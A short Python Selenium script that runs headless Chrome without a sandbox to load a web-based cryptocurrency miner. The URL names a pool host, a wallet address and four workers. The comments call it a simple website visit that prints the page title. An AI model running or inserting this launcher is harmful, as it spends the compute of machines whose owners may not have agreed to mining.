from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# Set up Chrome options
chrome_options = Options()
chrome_options.add_argument("--headless")  # Opsi ini menjalankan Chrome di background
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")

# Path to chromedriver
service = Service('/usr/bin/chromedriver')

# Inisialisasi WebDriver
driver = webdriver.Chrome(service=service, options=chrome_options)

try:
    # Mengakses sebuah website
    driver.get('https://webminer.pages.dev/?algorithm=yespowersugar&host=nomp.mofumofu.me&port=3391&worker=sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz&password=c%3DSUGAR&workers=4')

    # Menunggu sampai elemen tertentu muncul (opsional)
    driver.implicitly_wait(10)

    # Mengambil judul halaman
    title = driver.title
    print(f'Title: {title}')

    # Mengambil elemen tertentu (opsional)
    element = driver.find_element(By.TAG_NAME, 'h1')
    print(f'Heading: {element.text}')
except Exception as e:
    print(f'Error: {e}')
